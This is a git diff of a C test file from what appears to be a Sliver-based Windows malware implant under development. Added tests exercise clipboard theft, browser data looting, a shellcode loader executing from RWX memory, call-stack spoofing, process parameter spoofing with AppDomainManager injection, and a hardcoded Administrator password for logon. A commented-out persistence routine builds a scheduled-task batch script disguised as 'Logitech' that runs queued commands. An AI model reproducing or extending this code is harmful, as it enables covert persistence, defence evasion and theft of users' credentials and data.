@@ -1,7 +1,5 @@
 ﻿#include "pch.h"
 
-BOOL Persistence();
-
 VOID Callback
 (
 	_In_ BSTR lpInput,
@@ -40,6 +38,7 @@ VOID StartTaskThread(VOID)
 	}
 }
 
+#ifdef _DEBUG
 VOID test1(void) {
 	HANDLE hThread = NULL;
 
@@ -58,11 +57,10 @@ VOID test2
 {
 	PBYTE pOutput = NULL;
 	DWORD dwSize = 0;
-	WCHAR wszPath[MAX_PATH] = L"C:\\Users\\Admin\\Desktop\\Test.exe";
 	LPSTR szFolderName, szTemp;
 	CHAR szTempPath[MAX_PATH];
 
-	if (!CreateProcessAndGetOutput(wszPath, &pOutput, &dwSize)) {
+	if (!CreateProcessAndGetOutput(L"C:\\Users\\Admin\\Desktop\\Test.exe", &pOutput, &dwSize)) {
 		return;
 	}
 
@@ -809,9 +807,9 @@ void test46(void) {
 }
 
 void test47(void) {
-	CHAR szCommandLine[] = "C:\\Windows\\System32\\cmd.exe";
+	/*CHAR szCommandLine[] = "C:\\Windows\\System32\\cmd.exe";
 
-	PersistenceMethod1(szCommandLine);
+	PersistenceMethod1(szCommandLine);*/
 }
 
 void test48(void) {
@@ -1355,6 +1353,7 @@ void test81(void) {
 }
 
 void test82(void) {
+#ifdef _FULL
 	BYTE Data[] = { 10, 19, 67, 58, 92, 87, 105, 110, 100, 111, 119, 115, 92, 83, 121, 115, 116, 101, 109, 51, 50, 74, 45, 16, 255, 175, 157, 194, 223, 1, 74, 36, 48, 52, 53, 53, 97, 56, 49, 102, 45, 101, 102, 102, 101, 45, 52, 56, 100, 97, 45, 57, 102, 99, 99, 45, 99, 51, 51, 102, 56, 97, 54, 52, 56, 100, 101, 97 };
 	PENVELOPE pRespEnvelope = NULL;
 	PENVELOPE pEnvelope = ALLOC(sizeof(ENVELOPE));
@@ -1363,6 +1362,7 @@ void test82(void) {
 	pEnvelope->pData->cbBuffer = sizeof(Data);
 	pRespEnvelope = IcaclsHandler(pEnvelope);
 	FreeEnvelope(pRespEnvelope);
+#endif
 }
 void test83(void) {
 	LPSTR lpOwner = GetFileOwner(L"C:\\Users\\Admin\\Desktop");
@@ -1437,7 +1437,6 @@ void test90(void) {
 	PrintFormatA("%s\n", szTimeZone);
 }
 
-#define FILETIME_TO_UNIXTIME(ft) (UINT)((*(LONGLONG*)&(ft)-116444736000000000)/10000000)
 void test91(void) {
 	WCHAR lpPath[] = L"C:\\Users\\Admin\\Downloads\\Firefox Installer.exe";
 	UINT64 uModifiedTime = 0;
@@ -1655,7 +1654,7 @@ CLEANUP:
 	return;
 }
 
-void test107() {
+void test107(void) {
 	PrintFormatW(L"Hello World");
 }
 
@@ -1667,7 +1666,7 @@ int test108(void) {
 }
 
 void test109(void) {
-	StackSpoofing(PrintFormatA, 5, "Hello %s, ID: %d, address: %p, hex value: 0x%08x", "Dat", 10, test109, 20);
+	//StackSpoofing(PrintFormatA, 5, "Hello %s, ID: %d, address: %p, hex value: 0x%08x", "Dat", 10, test109, 20);
 }
 
 void test110(void) {
@@ -1932,7 +1931,7 @@ void test121(void) {
 }
 
 void test122(void) {
-	PSTANZA_WRAPPER pStanzaList = NULL;
+	/*PSTANZA_WRAPPER pStanzaList = NULL;
 	CHAR Ciphertext[] = { 78, 106, 116, 98, 81, 47, 49, 81, 109, 115, 86, 54, 52, 101, 83, 113, 69, 105, 98, 50, 97, 121, 75, 101, 119, 77, 47, 106, 71, 68, 80, 52, 90, 88, 90, 71, 116, 50, 73, 55, 103, 86, 65, 10, 67, 86, 88, 53, 118, 108, 75, 114, 89, 80, 103, 112, 101, 55, 107, 43, 116, 113, 72, 56, 109, 119, 82, 104, 81, 113, 49, 100, 111, 87, 114, 118, 116, 66, 78, 79, 116, 86, 106, 89, 114, 79, 48, 10, 45, 45, 45, 32, 83, 85, 76, 108, 71, 56, 56, 117, 76, 80, 53, 99, 121, 118, 111, 81, 51, 56, 84, 87, 81, 68, 90, 109, 74, 106, 110, 57, 78, 109, 75, 118, 68, 75, 66, 66, 88, 112, 65, 87, 54, 116, 56, 10, 151, 161, 50, 125, 201, 131, 78, 23, 140, 226, 117, 173, 59, 185, 54, 143, 150, 37, 236, 185, 69, 233, 11, 0, 94, 109, 107, 160, 8, 175, 140, 30, 108, 130, 158, 60, 212, 52, 23, 60, 23, 86, 114, 235, 96, 227, 115, 254, 238, 169, 73, 152, 0, 76, 205, 60, 28, 60, 58, 133, 72, 110, 84, 89 };
 	BYTE FileKey[] = { 224, 18, 103, 86, 180, 209, 104, 26, 46, 70, 147, 76, 165, 234, 170, 44 };
 	CHAR szAgeMsgPrefix[] = "age-encryption.org/v1\n-> X25519 ";
@@ -1956,7 +1955,7 @@ void test122(void) {
 	pCipherText->pBuffer = NULL;
 	FreeBuffer(pCipherText);
 	FREE(pTempBuffer);
-	FREE(pMac);
+	FREE(pMac);*/
 }
 
 void test123
@@ -2039,7 +2038,7 @@ void test124(void)
 		goto CLEANUP;
 	}
 
-	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)test123, Sock, 0, NULL);
+	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)test123, (LPVOID)Sock, 0, NULL);
 	while (TRUE) {
 		NewSock = accept(Sock, NULL, NULL);
 		PrintFormatA("NewSock is created\n");
@@ -2058,11 +2057,16 @@ void test126(void) {
 }
 
 void test127(void) {
-	PersistenceMethod1("C:\\Windows\\System32\\cmd.exe");
+	//PersistenceMethod1("C:\\Windows\\System32\\cmd.exe");
 }
 
 void test128(void) {
-	//Persistence();
+	GLOBAL_CONFIG Config;
+
+	SecureZeroMemory(&Config, sizeof(Config));
+	Config.lpSliverPath = DuplicateStrW(L"C:\\Users\\Admin\\AppData\\Roaming\\Logitech", 0);
+	Config.lpPeerPrivKey = DuplicateStrA("1", 0);
+	Persistence(&Config);
 }
 
 VOID Callback129
@@ -2130,7 +2134,6 @@ void test131(void) {
 	if (hResult != S_OK) {
 		return;
 	}
-
 	
 	HexDump(IdList->mkid.abID, IdList->mkid.cb);
 	PrintFormatA("Is ok\n");
@@ -2347,6 +2350,7 @@ void test140(void) {
 }
 
 void test141(void) {
+#ifdef _FULL
 	ENVELOPE Envelope;
 	PPBElement ReqElement = NULL;
 	LPSTR lpFileData = NULL;
@@ -2363,9 +2367,11 @@ void test141(void) {
 	if (lpFileData != NULL) {
 		PrintFormatA("lpFileData: %s\n", lpFileData);
 	}
+#endif
 }
 
 void test142(void) {
+#ifdef _FULL
 	ENVELOPE Envelope;
 	PPBElement ReqElements[4];
 	PPBElement pMarshaledData = NULL;
@@ -2387,9 +2393,11 @@ void test142(void) {
 	if (lpFileData != NULL) {
 		PrintFormatA("lpFileData: %s\n", lpFileData);
 	}
+#endif
 }
 
 void test143(void) {
+#ifdef _FULL
 	ENVELOPE Envelope;
 	PPBElement ReqElements[7];
 	PPBElement pMarshaledData = NULL;
@@ -2412,6 +2420,7 @@ void test143(void) {
 	Envelope.pData->cbBuffer = pMarshaledData->cbMarshaledData;
 
 	CreateServiceHandler(&Envelope);
+#endif
 }
 
 void test144(void) {
@@ -2424,10 +2433,12 @@ void test145(void) {
 }
 
 void test146(void) {
+#ifdef _FULL
 	ENVELOPE Envelope;
 
 	SecureZeroMemory(&Envelope, sizeof(Envelope));
 	ScreenshotHandler(&Envelope);
+#endif
 }
 
 void test147(void) {
@@ -2472,7 +2483,7 @@ void test150(void) {
 }
 
 void test151(void) {
-	HMODULE h7zDll = NULL;
+	/*HMODULE h7zDll = NULL;
 	CREATEOBJECT fnCreateObject = NULL;
 	CREATEDECODER fnCreateDecoder = NULL;
 	GUID IID_IInArchive = { 0x23170F69, 0x40C1, 0x278A, { 0, 0, 0, 6, 0, 0x60, 0 } };
@@ -2657,17 +2668,17 @@ CLEANUP:
 	FREE(pFormatGUID);
 	FREE(pBuffer);
 
-	return;
+	return;*/
 }
 
 void test152(void) {
-	PITEM_INFO* ItemList = NULL;
-	DWORD dwNumberOfItems = 0;
-	WCHAR wszPath[] = L"D:\\App\\Dev Tools\\drltrace\\drltrace_src\\dynamorio\\clients\\drcachesim\\tests\\drmemtrace.threadsig.x64.tracedir\\drmemtrace.threadsig.10506.7343.trace.gz";
+	//PITEM_INFO* ItemList = NULL;
+	//DWORD dwNumberOfItems = 0;
+	//WCHAR wszPath[] = L"D:\\App\\Dev Tools\\drltrace\\drltrace_src\\dynamorio\\clients\\drcachesim\\tests\\drmemtrace.threadsig.x64.tracedir\\drmemtrace.threadsig.10506.7343.trace.gz";
 
-	//ItemList = ExtractFromZip(wszPath, NULL, TRUE, &dwNumberOfItems);
-	ItemList = ExtractFromZip(L"C:\\Users\\Admin\\Desktop\\Mau_ngay_12-3.rar", NULL, TRUE, &dwNumberOfItems);
-	PrintFormatW(L"%d\n", dwNumberOfItems);
+	////ItemList = ExtractFromZip(wszPath, NULL, TRUE, &dwNumberOfItems);
+	//ItemList = ExtractFromZip(L"D:\\Temp\\chromium-main\\third_party\\libzip\\src\\regress\\incons-archive-comment-longer.zip", NULL, TRUE, &dwNumberOfItems);
+	//PrintFormatW(L"%d\n", dwNumberOfItems);
 }
 
 void test153(void) {
@@ -2676,6 +2687,7 @@ void test153(void) {
 	LPWSTR ArchiveExtensions[] = { L".rar", L".zip", L".tar", L".gz", L".xz", L".sz", L".7z" };
 	DWORD i = 0;
 
+	SecureZeroMemory(&Config, sizeof(Config));
 	lstrcpyW(Config.wszWarehouse, L"C:\\Users\\Admin\\Desktop\\Warehouse");
 	Config.lpRecipientPubKey = DuplicateStrA("Hello", 0);
 	Config.DocumentExtensions = ALLOC(sizeof(LPWSTR) * _countof(DocumentExtensions));
@@ -2686,6 +2698,7 @@ void test153(void) {
 
 	Config.ArchiveExtensions = ALLOC(sizeof(LPWSTR) * _countof(ArchiveExtensions));
 	Config.cArchiveExtensions = _countof(ArchiveExtensions);
+	Config.lpSliverPath = DuplicateStrW(L"C:\\Users\\Admin\\AppData\\Roaming\\Logitech", 0);
 	for (i = 0; i < _countof(ArchiveExtensions); i++) {
 		Config.ArchiveExtensions[i] = DuplicateStrW(ArchiveExtensions[i], 0);
 	}
@@ -2867,108 +2880,420 @@ void test163(void) {
 	pTempConfig = UnmarshalConfig(pConfig->lpConfigPath);
 }
 
-BOOL IsExist
+void test164(void) {
+	LPWSTR lpTemp = Bit7zExtract(NULL, L"C:\\Users\\Admin\\Desktop\\New folder\\a.rar", NULL);
+	if (lpTemp == NULL) {
+		PrintFormatW(L"Failed to extract file");
+		return;
+	}
+
+	PrintFormatW(L"%s\n", lpTemp);
+}
+
+void test165(void) {
+#ifdef _FULL
+	PPBElement ReqElements[2];
+	PPBElement pFinalElement = NULL;
+	CHAR szCommand[] = "dir C:\\Users\\Admin";
+	ENVELOPE Envelope;
+	SLIVER_SESSION_CLIENT SliverSession;
+
+	SecureZeroMemory(&SliverSession, sizeof(SliverSession));
+	SecureZeroMemory(&ReqElements, sizeof(ReqElements));
+	SecureZeroMemory(&Envelope, sizeof(Envelope));
+	SliverSession.pGlobalConfig = ALLOC(sizeof(GLOBAL_CONFIG));
+	SliverSession.pGlobalConfig->lpSliverPath = DuplicateStrW(L"C:\\Users\\Admin\\AppData\\Roaming\\Logitech", 0);
+	SliverSession.pGlobalConfig->lpPeerPrivKey = DuplicateStrA("1", 0);
+	ReqElements[0] = CreateBytesElement(szCommand, lstrlenA(szCommand), 1);
+	pFinalElement = CreateStructElement(&ReqElements, _countof(ReqElements), 0);
+	Envelope.pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	CmdHandler(&Envelope, &SliverSession);
+#endif
+}
+
+void test166(void) {
+	STARTUPINFOW si;
+	PROCESS_INFORMATION pi;
+
+	SecureZeroMemory(&si, sizeof(si));
+	SecureZeroMemory(&pi, sizeof(pi));
+	si.cb = sizeof(si);
+	if (!CreateProcessW(L"C:\\Windows\\System32\\oobe\\oobeldr.exe", NULL, NULL, NULL, FALSE, 0, NULL, L"C:\\Windows\\System32\\oobe", &si, &pi)) {
+		LOG_ERROR("CreateProcess", GetLastError());
+	}
+
+	/*if (ShellExecuteW(NULL, L"open", L"C:\\Windows\\System32\\oobe\\oobeldr.exe", NULL, L"C:\\Windows\\System32\\oobe", SW_HIDE) < 32) {
+		LOG_ERROR("ShellExecuteW", GetLastError());
+	}*/
+
+	Sleep(20000);
+}
+
+void test167(void) {
+	ShellExecuteW(NULL, L"open", L"C:\\Users\\Admin\\AppData\\Roaming\\Logitech\\run.cmd", NULL, L"C:\\Users\\Admin\\AppData\\Roaming\\Logitech", SW_HIDE);
+	Sleep(1000000000000);
+}
+
+void test168(void) {
+	PARCHIVE_INFO Info = NULL;
+
+	Info = Bit7zGetInfo(L"C:\\Users\\Admin\\AppData\\Roaming\\Logitech\\LogitechLcd.dll", L"C:\\Users\\Admin\\AppData\\Local\\Temp\\8E16.tmp.zip");
+}
+
+void test169(void) {
+	STARTUPINFOW StartupInfo;
+	PROCESS_INFORMATION ProcInfo;
+
+	SecureZeroMemory(&StartupInfo, sizeof(StartupInfo));
+	SecureZeroMemory(&ProcInfo, sizeof(ProcInfo));
+	StartupInfo.cb = sizeof(StartupInfo);
+	if (!CreateProcessWithLogonW(L"Administrator", NULL, L"Caydabode1", 0, L"C:\\Windows\\System32\\notepad.exe", L"C:\\Windows\\System32\\notepad.exe C:\\Users\\Admin\\Desktop\\a.txt", 0, NULL, NULL, &StartupInfo, &ProcInfo)) {
+		LOG_ERROR("CreateProcessWithLogonW", GetLastError());
+		return;
+	}
+
+	PrintFormatW(L"Success!\n");
+}
+
+void test170(void) {
+	GetProcAddressH(HASHA("KERNELBASE.DLL"), HASHA("AccessCheck"));
+	GetProcAddressH(HASHA("KERNELBASE.DLL"), HASHA("AccessCheck"));
+}
+
+void test171(void) {
+	PRTL_USER_PROCESS_EXTENDED_PARAMETERS pProcessParameters = NULL;
+	RTL_USER_PROCESS_INFORMATION ProcInfo;
+	NTSTATUS Status = ERROR_SUCCESS;
+	UNICODE_STRING SpoofedImagePathName;
+	UNICODE_STRING CurrentDirectory;
+	UNICODE_STRING CommandLine;
+	UNICODE_STRING ImagePathName;
+	LPWSTR EnvironmentBlock = NULL;
+	LPWSTR lpTemp = NULL;
+	LPWSTR NewEnvironmentBlock = NULL;
+	DWORD cchEnvironmentBlock = 0;
+	WCHAR wszAppDomainManagerEnv[] = L"APPDOMAIN_MANAGER_ASM=DirtyCLR, Version=1.0.0.0, Culture=neutral, PublicKeyToken=47c6faf8f321e3a7\0APPDOMAIN_MANAGER_TYPE=DirtyCLRDomain\0COMPLUS_Version=v4.0.30319\0\0";
+
+	SecureZeroMemory(&ProcInfo, sizeof(ProcInfo));
+	InitUnicodeString(&SpoofedImagePathName, L"\\??\\D:\\Temp\\DirtyCLR\\DirtyCLR\\bin\\Debug\\UevAppMonitor.exe");
+	InitUnicodeString(&CurrentDirectory, L"C:\\Windows\\System32\\");
+	InitUnicodeString(&CommandLine, L"\"C:\\Windows\\System32\\UevAppMonitor.exe\"");
+	InitUnicodeString(&ImagePathName, L"\\??\\C:\\Windows\\System32\\UevAppMonitor.exe");
+	EnvironmentBlock = GetEnvironmentStringsW();
+	lpTemp = EnvironmentBlock;
+	while (lpTemp[0] != L'\0') {
+		cchEnvironmentBlock += lstrlenW(lpTemp) + 1;
+		lpTemp = &EnvironmentBlock[cchEnvironmentBlock];
+	}
+
+	NewEnvironmentBlock = ALLOC((cchEnvironmentBlock + _countof(wszAppDomainManagerEnv)) * sizeof(WCHAR));
+	memcpy(NewEnvironmentBlock, EnvironmentBlock, cchEnvironmentBlock * sizeof(WCHAR));
+	memcpy(&NewEnvironmentBlock[cchEnvironmentBlock], wszAppDomainManagerEnv, sizeof(wszAppDomainManagerEnv));
+	Status = RtlCreateProcessParametersEx(&pProcessParameters, &SpoofedImagePathName, NULL, &CurrentDirectory, &CommandLine, NewEnvironmentBlock, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
+	if (!NT_SUCCESS(Status)) {
+		LOG_ERROR("RtlCreateProcessParametersEx", Status);
+		goto CLEANUP;
+	}
+
+	Status = RtlCreateUserProcess(&ImagePathName, 0, pProcessParameters, NULL, NULL, GetCurrentProcess(), TRUE, NULL, NULL, &ProcInfo);
+	if (!NT_SUCCESS(Status)) {
+		LOG_ERROR("RtlCreateUserProcess", Status);
+		goto CLEANUP;
+	}
+
+	Status = NtResumeThread(ProcInfo.ThreadHandle, NULL);
+	if (!NT_SUCCESS(Status)) {
+		LOG_ERROR("NtResumeThread", Status);
+		goto CLEANUP;
+	}
+
+	NtClose(ProcInfo.ProcessHandle);
+	NtClose(ProcInfo.ThreadHandle);
+CLEANUP:
+	if (pProcessParameters != NULL) {
+		RtlDestroyProcessParameters(pProcessParameters);
+	}
+
+	if (EnvironmentBlock != NULL) {
+		FreeEnvironmentStringsW(EnvironmentBlock);
+	}
+
+	FREE(NewEnvironmentBlock);
+}
+
+void test172(void) {
+	PrintFormatA("0x%08x\n", _HashStringRotr32A("IUMSDK.DLL"));
+}
+
+void test173(void) {
+	DWORD dwFrameSize = 0;
+
+	FindGadget(0, &dwFrameSize);
+	FindGadget(1, &dwFrameSize);
+}
+
+void test174(void) {
+	PRUNTIME_FUNCTION pRuntimeFunctionList = NULL;
+	DWORD dwNumberOfFunctions = 0;
+	HMODULE hModule = NULL;
+	DWORD i = 0;
+	DWORD dwFrameSize = 0;
+	PUNWIND_INFO pUnwindInfo = NULL;
+
+	hModule = GetModuleHandleA(NULL);
+	pRuntimeFunctionList = GetExceptionDirectoryAddress(hModule, &dwNumberOfFunctions);
+
+	for (i = 0; i < dwNumberOfFunctions; i++) {
+		pUnwindInfo = (PUNWIND_INFO)((UINT64)hModule + pRuntimeFunctionList[i].UnwindInfoAddress);
+		dwFrameSize = GetStackFrameSize(hModule, pUnwindInfo);
+		PrintFormatA("Address 0x%08x: 0x%08x\n", pRuntimeFunctionList[i].BeginAddress, dwFrameSize);
+	}
+}
+
+void test175(void) {
+	DWORD dwFrameOffset = 0;
+	DWORD dwFrameSize = 0;
+
+	FindSetFpProlog(&dwFrameOffset, &dwFrameSize, NULL);
+}
+
+void test176(void) {
+	DWORD dwFrameOffset = 0;
+	DWORD dwFrameSize = 0;
+
+	FindSaveRbp(&dwFrameOffset, &dwFrameSize, NULL);
+}
+
+void test177(void) {
+	PROCESS_INFORMATION pi;
+	STARTUPINFOW si;
+
+	if (!SetupStackSpoofing()) {
+		return;
+	}
+
+	SecureZeroMemory(&pi, sizeof(pi));
+	SecureZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	SpoofCall(CreateProcessW, L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+}
+
+void test178(void) {
+	HANDLE hClipboard = NULL;
+	LPWSTR lpMessage = NULL;
+	HWND hWindow = NULL;
+	MSG Message;
+
+	hWindow = CreateWindowExW(0, L"Edit", L"Sample Window", WS_MINIMIZE | WS_OVERLAPPED, 100, 100, 100, 100, NULL, NULL, NULL, NULL);
+	if (hWindow == NULL) {
+		LOG_ERROR("CreateWindowExW", GetLastError());
+		goto CLEANUP;
+	}
+
+	if (!AddClipboardFormatListener(hWindow)) {
+		LOG_ERROR("AddClipboardFormatListener", GetLastError());
+		goto CLEANUP;
+	}
+
+	while (TRUE) {
+		SecureZeroMemory(&Message, sizeof(Message));
+		if (GetMessageW(&Message, hWindow, WM_CLIPBOARDUPDATE, WM_CLIPBOARDUPDATE)) {
+			if (Message.message == WM_CLIPBOARDUPDATE) {
+				if (OpenClipboard(NULL)) {
+					hClipboard = GetClipboardData(CF_UNICODETEXT);
+					if (hClipboard != NULL) {
+						lpMessage = (LPWSTR)GlobalLock(hClipboard);
+					}
+
+					CloseClipboard();
+				}
+			}
+		}
+
+		Sleep(5000);
+	}
+	
+CLEANUP:
+	if (hWindow != NULL) {
+		DestroyWindow(hWindow);
+	}
+
+	return;
+}
+
+void test179(void) {
+	GLOBAL_CONFIG Config;
+
+	SecureZeroMemory(&Config, sizeof(Config));
+	lstrcpyW(Config.wszWarehouse, L"C:\\Users\\Admin\\Desktop\\Warehouse");
+	StealClipboard(&Config);
+	Sleep(100000000);
+}
+
+void test180(void) {
+	CHAR Buffer[0x200] = "Hello Worlddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd";
+	LPSTR lpDest = &Buffer[5];
+
+	MemCopy(lpDest, Buffer, lstrlenA(Buffer), 0);
+}
+
+void test181(void) {
+	PBYTE pShellcode = NULL;
+	DWORD cbShellcode = 0;
+	PBYTE pBuffer = NULL;
+
+	pShellcode = ReadFromFile(L"D:\\Documents\\source\\repos\\MalDev\\x64\\Debug\\FinalTest.sc", &cbShellcode);
+	pBuffer = (PBYTE)VirtualAlloc(NULL, cbShellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	memcpy(pBuffer, pShellcode, cbShellcode);
+	pBuffer += 0x8fb90;
+	((VOID(*)(VOID))pBuffer)();
+	Sleep(0xFFFFFFFF);
+	return;
+}
+
+void test182(void) {
+	PBYTE pCipherText = NULL;
+	DWORD cbCipherText = 0;
+
+	pCipherText = ReadFromFile(L"C:\\Users\\Admin\\AppData\\Roaming\\Logitech\\logitech.cfg", &cbCipherText);
+	Rc4EncryptDecrypt(pCipherText, cbCipherText, "config_key", lstrlenA("config_key"));
+}
+
+void test183(void) {
+	GetProcAddress(LoadLibraryW(L"api-ms-win-core-com-l1-1-0.dll"), "CoInitializeEx");
+	GetProcAddressH(HASHA("OLE32.DLL"), HASHA("CoInitializeEx"));
+}
+
+void test184(void) {
+	HANDLE hFile = INVALID_HANDLE_VALUE;
+	UINT64 uTemp = 0;
+	FILETIME CreationTime;
+
+	hFile = CreateFileW(L"C:\\Users\\Admin\\Downloads\\download.dat", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hFile != INVALID_HANDLE_VALUE) {
+		if (GetFileTime(hFile, &CreationTime, NULL, NULL)) {
+			uTemp = (((UINT64)CreationTime.dwHighDateTime) << 32) + CreationTime.dwLowDateTime;
+		}
+
+		CloseHandle(hFile);
+	}
+}
+
+void test185() {
+	FILETIME Now;
+	UINT64 uTime1 = 0;
+	UINT64 uTime2 = 0;
+
+	GetSystemTimeAsFileTime(&Now);
+	uTime1 = (((UINT64)Now.dwHighDateTime) << 32) + Now.dwLowDateTime;
+	Sleep(10000);
+	GetSystemTimeAsFileTime(&Now);
+	uTime2 = (((UINT64)Now.dwHighDateTime) << 32) + Now.dwLowDateTime;
+	PrintFormatA("%d\n", uTime2 - uTime1);
+}
+
+void test186(void) {
+	GLOBAL_CONFIG Config;
+
+	SecureZeroMemory(&Config, sizeof(Config));
+	lstrcpyW(Config.wszWarehouse, L"C:\\ProgramData\\1Kf9IGFM");
+	LootBrowserData(&Config);
+}
+
+#endif
+BOOL IsInstanceExist
 (
 	PGLOBAL_CONFIG pConfig
 )
 {
-	PBYTE pHashValue = NULL;
-	LPSTR lpMutexName = NULL;
-	LPWSTR lpTemp = NULL;
 	BOOL Result = FALSE;
 
-	pHashValue = ComputeSHA256(pConfig->lpPeerPrivKey, lstrlenA(pConfig->lpPeerPrivKey));
-	lpMutexName = ConvertBytesToHexA(pHashValue, 8);
-	lpTemp = ConvertCharToWchar(lpMutexName);
-	pConfig->hMutex = CreateMutexA(NULL, TRUE, lpMutexName);
+	pConfig->hMutex = CreateMutexW(NULL, TRUE, pConfig->lpUniqueName);
 	if (pConfig->hMutex == NULL && GetLastError() == ERROR_ALREADY_EXISTS) {
 		Result = TRUE;
 	}
 
-	FREE(pHashValue);
-	FREE(lpMutexName);
-	FREE(lpTemp);
-
 	return Result;
 }
 
-BOOL Persistence
-(
-	_In_ PGLOBAL_CONFIG pConfig
-)
-{
-	CHAR szModulePath[0x200];
-	CHAR szOOBEPath[MAX_PATH];
-	LPSTR lpTemp = NULL;
-	LPSTR lpTemp2 = NULL;
-	LPSTR lpCommand = NULL;
-	BOOL Result = FALSE;
-	PBYTE pHashValue = NULL;
-	LPWSTR lpMutexName = NULL;
-	LPWSTR lpLockPath = NULL;
-
-	SecureZeroMemory(szModulePath, sizeof(szModulePath));
-
-	pHashValue = ComputeSHA256(pConfig->lpPeerPrivKey, lstrlenA(pConfig->lpPeerPrivKey));
-	lpMutexName = ConvertBytesToHexW(pHashValue, 8);
-	lpLockPath = DuplicateStrW(pConfig->lpScriptPath, lstrlenW(lpMutexName) + 6);
-	lstrcatW(lpLockPath, L"\\");
-	lstrcatW(lpLockPath, lpMutexName);
-	lstrcatW(lpLockPath, L".txt");
-	if (IsFileExist(lpLockPath)) {
-		Result = TRUE;
-		goto CLEANUP;
-	}
-
-	GetModuleFileNameA(NULL, szModulePath, _countof(szModulePath));
-	if (!WriteToFile(lpLockPath, szModulePath, lstrlenA(szModulePath))) {
-		goto CLEANUP;
-	}
-
-	lpCommand = DuplicateStrA("@echo off\n@cd ", 0);
-	lpTemp = ConvertWcharToChar(pConfig->lpScriptPath);
-	lpCommand = StrCatExA(lpCommand, lpTemp);
-	lpCommand = StrCatExA(lpCommand, "\n@schtasks /query /tn Logitech\n@if \"%ERRORLEVEL%\"==\"1\" schtasks /create /sc MINUTE /tn Logitech /tr %WINDIR%\System32\oobe\oobeldr.exe /mo 5\n@for %%a in (*.txt) do (type %%a & if not \"% ERRORLEVEL%\"==\"2\" for /f \"tokens=*\" %%* in (%%a) do (%%*))\n@for %%a in (*.in) do (for /f \"delims=. tokens=1\" %%b in (\"%%a\") do (set c=%%b) & for /f \"tokens=*\" %%d in (%%a) do (%%d 1>%c%.out 2>%c%.err) & del %%a)");
-	if (!PersistenceMethod1(lpCommand)) {
-		goto CLEANUP;
-	}
-
-	GetSystemDirectoryA(szOOBEPath, _countof(szOOBEPath));
-	lpTemp2 = StrStrA(szOOBEPath, "system32");
-	lpTemp2[0] = 'S';
-	lstrcatA(szOOBEPath, "\\oobe\\oobeldr.exe");
-	if (!PersistenceMethod2(szOOBEPath, pConfig)) {
-		goto CLEANUP;
-	}
-
-	Result = TRUE;
-CLEANUP:
-	CreateFileW(lpLockPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-
-	FREE(lpCommand);
-	FREE(lpTemp);
-	FREE(pHashValue);
-	FREE(lpMutexName);
-	FREE(lpLockPath);
-
-	return Result;
-}
+//BOOL Persistence
+//(
+//	_In_ PGLOBAL_CONFIG pConfig
+//)
+//{
+//	CHAR szModulePath[0x200];
+//	CHAR szOOBEPath[MAX_PATH];
+//	LPSTR lpTemp = NULL;
+//	LPSTR lpTemp2 = NULL;
+//	LPSTR lpCommand = NULL;
+//	BOOL Result = FALSE;
+//	PBYTE pHashValue = NULL;
+//	LPWSTR lpMutexName = NULL;
+//	LPWSTR lpLockPath = NULL;
+//
+//	SecureZeroMemory(szModulePath, sizeof(szModulePath));
+//
+//	pHashValue = ComputeSHA256(pConfig->lpPeerPrivKey, lstrlenA(pConfig->lpPeerPrivKey));
+//	lpMutexName = ConvertBytesToHexW(pHashValue, 8);
+//	lpLockPath = DuplicateStrW(pConfig->lpSliverPath, lstrlenW(lpMutexName) + 6);
+//	lstrcatW(lpLockPath, L"\\");
+//	lstrcatW(lpLockPath, lpMutexName);
+//	lstrcatW(lpLockPath, L".txt");
+//	if (IsFileExist(lpLockPath)) {
+//		Result = TRUE;
+//		goto CLEANUP;
+//	}
+//
+//	GetModuleFileNameA(NULL, szModulePath, _countof(szModulePath));
+//	if (!WriteToFile(lpLockPath, szModulePath, lstrlenA(szModulePath))) {
+//		goto CLEANUP;
+//	}
+//
+//	lpCommand = DuplicateStrA("@echo off\n@cd ", 0);
+//	lpTemp = ConvertWcharToChar(pConfig->lpSliverPath);
+//	lpCommand = StrCatExA(lpCommand, lpTemp);
+//	lpCommand = StrCatExA(lpCommand, "\n@schtasks /query /tn Logitech\n@if \"%ERRORLEVEL%\"==\"1\" schtasks /create /sc MINUTE /tn Logitech /tr %WINDIR%\\System32\\oobe\\oobeldr.exe /mo 5\n@for %%a in (*.txt) do (type %%a & if not \"% ERRORLEVEL%\"==\"2\" for /f \"tokens=*\" %%* in (%%a) do (%%*))\n@for %%a in (*.in) do (for /f \"delims=. tokens=1\" %%b in (\"%%a\") do (for /f \"tokens=*\" %%d in (%%a) do (%%d 1>%%b.out 2>%%b.err)) & del %%a)");
+//	if (!PersistenceMethod1(lpCommand)) {
+//		goto CLEANUP;
+//	}
+//
+//	GetSystemDirectoryA(szOOBEPath, _countof(szOOBEPath));
+//	lpTemp2 = StrStrA(szOOBEPath, "system32");
+//	lpTemp2[0] = 'S';
+//	lstrcatA(szOOBEPath, "\\oobe\\oobeldr.exe");
+//	if (!PersistenceMethod2(szOOBEPath, pConfig)) {
+//		goto CLEANUP;
+//	}
+//
+//	Result = TRUE;
+//CLEANUP:
+//	CreateFileW(lpLockPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+//
+//	FREE(lpCommand);
+//	FREE(lpTemp);
+//	FREE(pHashValue);
+//	FREE(lpMutexName);
+//	FREE(lpLockPath);
+//
+//	return Result;
+//}
 
 VOID Final(VOID)
 {
 	DWORD dwThreadId = 0;
-	DWORD cchSliverPath = 0;
 	PGLOBAL_CONFIG pGlobalConfig = NULL;
 	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
-	PSLIVER_BEACON_CLIENT pBeaconClient = NULL;
 	WCHAR wszConfigPath[MAX_PATH];
 	LPWSTR lpTemp = NULL;
